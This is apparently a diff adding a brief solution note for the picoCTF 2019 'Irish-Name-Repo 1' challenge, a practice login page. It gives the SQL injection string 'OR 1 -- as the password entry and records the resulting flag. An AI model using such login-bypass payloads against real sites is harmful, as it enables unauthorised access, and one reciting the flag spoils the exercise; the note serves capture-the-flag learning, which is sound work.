@@ -1,0 +1,11 @@
+Irish-Name-Repo 1 - Points: 300
+There is a website running at https://2019shell1.picoctf.com/problem/32241/ (link) or http://2019shell1.picoctf.com:32241
+Do you think you can log us in? Try to see if you can login!
+--------------------------------
+in password enter 'OR 1 --
+
+---------------------------------
+flag is: picoCTF{s0m3_SQL_0397f20c}
+
+
+
